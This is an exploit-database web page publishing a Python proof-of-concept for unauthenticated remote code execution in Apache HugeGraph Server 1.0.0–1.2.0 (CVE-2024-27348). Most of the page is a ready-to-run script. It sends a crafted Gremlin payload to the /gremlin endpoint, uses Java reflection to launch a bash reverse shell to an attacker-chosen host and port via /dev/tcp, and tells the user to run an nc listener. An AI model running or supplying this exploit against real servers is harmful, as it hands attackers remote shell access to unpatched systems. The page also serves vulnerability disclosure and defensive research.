---
title: Apache HugeGraph Server 1.2.0 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2025040018
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-11
fetch_date: 2025-10-06T22:03:55.445681
---

# Apache HugeGraph Server 1.2.0 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache HugeGraph Server 1.2.0 Remote Code Execution (RCE)** **2025.04.10**  Credit:  **[Yesith Alvarez](https://cxsecurity.com/author/Yesith%2BAlvarez/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Apache HugeGraph < 1.2.0 Remote Code Execution (Unauthenticated)
# Exploit Author: Yesith Alvarez
# Vendor Homepage: https://hugegraph.apache.org/docs/download/download/
# Version: Apache HugeGraph 1.0.0 - 1.2.0
# CVE : CVE-2024–27348
from requests import Request, Session
import sys
import json
def title():
print('''
\_\_\_\_\_\_ \_\_\_\_\_\_\_ \_\_\_\_ \_\_\_ \_\_\_\_ \_ \_ \_\_\_\_ \_\_\_\_\_ \_\_\_\_\_ \_ \_ \_\_\_
/ \_\_\_\ \ / / \_\_\_\_| |\_\_\_ \ / \_ \\_\_\_ \| || | |\_\_\_ \\_\_\_ |\_\_\_ /| || | ( \_ )
| | \ \ / /| \_| \_\_\_\_\_ \_\_) | | | |\_\_) | || |\_ \_\_\_\_\_ \_\_) | / / |\_ \| || |\_ / \_ \
| |\_\_\_ \ V / | |\_\_|\_\_\_\_\_/ \_\_/| |\_| / \_\_/|\_\_ \_|\_\_\_\_\_/ \_\_/ / / \_\_\_) |\_\_ \_| (\_) |
\\_\_\_\_| \\_/ |\_\_\_\_\_| |\_\_\_\_\_|\\_\_\_/\_\_\_\_\_| |\_| |\_\_\_\_\_/\_/ |\_\_\_\_/ |\_| \\_\_\_/
[+] Reverse shell
Author: Yesith Alvarez
Github: https://github.com/yealvarez
Linkedin: https://www.linkedin.com/in/pentester-ethicalhacker/
Code improvements: https://github.com/yealvarez/CVE/blob/main/CVE-2024–27348/exploit.py
''')
def exploit(url, lhost, lport):
payload = {"gremlin": "Thread thread = Thread.currentThread();Class clz = Class.forName(\"java.lang.Thread\");java.lang.reflect.Field field = clz.getDeclaredField(\"name\");field.setAccessible(true);field.set(thread, \"VICARIUS\");Class processBuilderClass = Class.forName(\"java.lang.ProcessBuilder\");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\"bash\", \"-c\", \"bash -i>&/dev/tcp/"+lhost+"/"+lport+"\", \"0>&1\");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\"start\");startMethod.invoke(processBuilderInstance);", "bindings": {}, "language": "gremlin-groovy", "aliases": {}}
headers = {
'Content-Type': 'application/json'}
s = Session()
url = url + "/gremlin"
req = Request('POST', url, json=payload, headers=headers)
prepped = req.prepare()
del prepped.headers['Content-Type']
resp = s.send(prepped,
verify=False,
timeout=15)
print(prepped.headers)
print(url)
print(resp.headers)
print(payload)
print(resp.status\_code)
print(resp.text)
if \_\_name\_\_ == '\_\_main\_\_':
title()
if(len(sys.argv) < 4):
print('[+] USAGE: python3 %s https://<target\_url> lhost lport \n'%(sys.argv[0]))
print('[+] USAGE: python3 %s https://192.168.0.10 192.168.0.2 4444\n'%(sys.argv[0]))
print('[+] Do not forget to run the listener: nc -lvp 4444\n')
exit(0)
else:
exploit(sys.argv[1],sys.argv[2],sys.argv[3])

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040018)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top